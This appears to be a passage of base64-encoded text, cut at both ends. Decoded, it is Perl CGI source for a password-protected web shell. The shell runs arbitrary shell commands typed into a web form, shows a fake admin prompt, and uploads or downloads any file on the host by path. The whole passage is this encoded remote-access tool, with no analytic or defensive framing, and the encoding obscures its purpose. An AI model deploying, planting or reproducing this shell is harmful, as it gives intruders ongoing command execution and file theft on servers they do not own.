tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dpbiANCnsNCglpZigkTG9naW5QYXNzd29yZCBlcSAkcGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZA0KCXsNCgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoJCX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGZvbnQgY29sb3I9IiMwMEZGMDAiPiRQcm9tcHQ8L2ZvbnQ+IA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiIHNpemU9IjI1Ij4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQogICAgICAgICAgIA0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8YnI+PGJyPg0KVXBsb2FkOiAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcHJpbnQgPDxFTkQ7DQo8L3htcD4NCjxjb2RlPg0KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLg0KPGJyPktpbGxlZCBpdCENCjxjb2RlPg0KRU5EDQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlleGl0Ow0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBleGVjdXRlIGNvbW1hbmRzLiBJdCBkaXNwbGF5cyB0aGUgb3V0cHV0IG9mIHRoZQ0KIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQ0KIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluDQojIGFuIGludGVybmFsIHZhcmlhYmxlIGFuZCBpcyB1c2VkIGVhY2ggdGltZSBhIGNvbW1hbmQgaGFzIHRvIGJlIGV4ZWN1dGVkLiBUaGUNCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMNCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkNCgkJJE9sZERpciA9ICRDdXJyZW50RGlyOw0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJcHJpbnQgIjxkaXYgc3R5bGU9J2Zsb2F0OiBjZW50ZXI7IHRleHQtYWxpZ246IGxlZnQ7Jz4iOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7DQoJfQ0KCWVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJcHJpbnQgIjxkaXYgc3R5bGU9J2Zsb2F0OiBjZW50ZXI7IHRleHQtYWxpZ246IGxlZnQ7Jz4iOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcCBzdHlsZT0nY29sb3I6ICMwMEZGMDA7Jz4iOw0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQoJCWlmKCEkV2luTlQpDQoJCXsNCgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQoJCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJCX0NCgkJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KCQl7DQoJCQkkfD0xOw0KCQkJJENvbW1hbmQgLj0gIiB8IjsNCgkJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQkJew0KCQkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJCXByaW50ICIkX1xuIjsNCgkJCX0NCgkJCSR8PTA7DQoJCX0NCgkJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQoJCXsNCgkJCXByaW50IGAkQ29tbWFuZGA7DQoJCX0NCgkJaWYoISRXaW5OVCkNCgkJew0KCQkJYWxhcm0oMCk7DQoJCX0NCgkJcHJpbnQgIjwveG1wPiI7DQoJfQ0KCXByaW50ICI8L2Rpdj4iOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gZG93bmxvYWQgdGhlIHNwZWNpZmllZCBmaWxlLiBUaGUgcGFnZSBhbHNvIGNvbnRhaW5zIGEgYXV0by1yZWZyZXNoDQojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQoJbG9jYWwoJEZpbGVVcmwpID0gQF87DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCXByaW50IDw8RU5EOw0KPGNvZGU+DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4uDQo8L2NvZGU+DQpFTkQNCgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KCWVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCE8L2NvZGU+IjsNCgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNURE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShTRU5ERklMRSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkITwvY29kZT4iOw0KCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBzdGFydHMgdGhlIHVwbG9hZCBwcm9jZXNzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFVwbG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQkmUHJpbnRGaWxlVXBsb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJcmV0dXJuOw0KCX0NCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoNCgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KCXByaW50ICI8Y29kZT5VcGxvYWRpbmcgJFRyYW5zZmVyRmlsZSB0byAkQ3VycmVudERpci4uLjxicj4iOw0KDQoJIyBnZXQgdGhlIGZ1bGxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgY3JlYXRlZA0KCWNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7DQoJJFRhcmdldE5hbWUgLj0gJFBhdGhTZXAuJDE7DQoNCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCgkjIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQNCglpZigtZSAkVGFyZ2V0TmFtZSAmJiAkT3B0aW9ucyBuZSAib3ZlcndyaXRlIikNCgl7DQoJCXByaW50ICJGYWlsZWQ6IERlc3RpbmF0aW9uIGZpbGUgYWxyZWFkeSBleGlzdHMuPGJyPiI7DQoJfQ0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQoJew0KCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCgkJew0KCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCgkJCWNsb3NlKFVQTE9BREZJTEUpOw0KCQkJcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KCQkJcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCXByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQoJCX0NCgl9DQoJcHJpbnQgIjwvY29kZT4iOw0KCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb